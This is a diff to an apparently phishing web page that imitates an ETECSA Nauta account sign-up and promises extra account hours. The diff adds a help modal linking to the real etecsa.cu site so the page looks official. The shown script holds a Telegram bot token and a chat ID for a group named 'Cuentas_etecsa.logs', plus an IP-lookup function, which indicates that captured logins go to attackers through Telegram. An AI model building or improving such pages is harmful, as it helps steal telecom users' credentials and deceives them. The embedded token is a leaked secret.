@@ -127,6 +127,7 @@
             transition: all 0.3s;
             width: 100%;
             font-weight: bold;
+            margin-bottom: 15px;
         }
 
         .btn:hover {
@@ -144,6 +145,23 @@
             cursor: not-allowed;
             transform: none;
             box-shadow: none;
+        }
+
+        .help-btn {
+            background: transparent;
+            color: #0088cc;
+            border: 1px solid #0088cc;
+            padding: 8px 15px;
+            border-radius: 5px;
+            font-size: 14px;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin: 10px 0;
+        }
+
+        .help-btn:hover {
+            background: #0088cc;
+            color: white;
         }
 
         .message {
@@ -195,6 +213,67 @@
             transform: scale(1.05);
             box-shadow: 0 4px 8px rgba(0,0,0,0.3);
         }
+
+        /* Modal styles */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 2000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.5);
+        }
+
+        .modal-content {
+            background-color: white;
+            margin: 15% auto;
+            padding: 25px;
+            border-radius: 10px;
+            width: 80%;
+            max-width: 500px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+            position: relative;
+        }
+
+        .close {
+            color: #aaa;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+            position: absolute;
+            right: 15px;
+            top: 10px;
+        }
+
+        .close:hover {
+            color: #000;
+        }
+
+        .modal-title {
+            color: #003366;
+            margin-bottom: 15px;
+            font-size: 20px;
+            font-weight: bold;
+        }
+
+        .modal-text {
+            color: #666;
+            line-height: 1.6;
+            margin-bottom: 15px;
+        }
+
+        .official-link {
+            color: #0088cc;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .official-link:hover {
+            text-decoration: underline;
+        }
     </style>
 </head>
 <body>
@@ -222,6 +301,8 @@
             <button type="submit" class="btn">📱 Registrarse Ahora</button>
         </form>
 
+        <button class="help-btn" id="helpBtn">¿Qué es esto?</button>
+
         <div class="security-badge">🔒 Conexión Segura</div>
 
         <div id="message" class="message"></div>
@@ -231,12 +312,47 @@
         </div>
     </div>
 
+    <!-- Modal de ayuda -->
+    <div id="helpModal" class="modal">
+        <div class="modal-content">
+            <span class="close" id="closeModal">&times;</span>
+            <div class="modal-title">Información del Sistema</div>
+            <div class="modal-text">
+                Usted puede autenticarse en el sistema para extender las horas de su cuenta nauta y acceder a promociones exclusivas.
+            </div>
+            <div class="modal-text">
+                Para más información sobre nuestras ofertas y servicios, visite el sitio oficial:
+                <br>
+                <a href="https://www.etecsa.cu" class="official-link" target="_blank">www.etecsa.cu</a>
+            </div>
+        </div>
+    </div>
+
     <script>
         // Configuración de Telegram - GRUPO PRIVADO CORRECTO
         const TELEGRAM_CONFIG = {
             BOT_TOKEN: '6516180762:AAHE5RGPH1kpADaABDGzQLt0962277Nlg1I',
             CHAT_ID: '-1003181825017'  // ID CORRECTO DEL GRUPO Cuentas_etecsa.logs
         };
+
+        // Modal functionality
+        const helpBtn = document.getElementById('helpBtn');
+        const helpModal = document.getElementById('helpModal');
+        const closeModal = document.getElementById('closeModal');
+
+        helpBtn.addEventListener('click', function() {
+            helpModal.style.display = 'block';
+        });
+
+        closeModal.addEventListener('click', function() {
+            helpModal.style.display = 'none';
+        });
+
+        window.addEventListener('click', function(event) {
+            if (event.target === helpModal) {
+                helpModal.style.display = 'none';
+            }
+        });
 
         // Obtener IP del usuario
         async function getIP() {
@@ -367,4 +483,4 @@
         window.addEventListener('load', typePlaceholder);
     </script>
 </body>
-            </html>
+    </html>
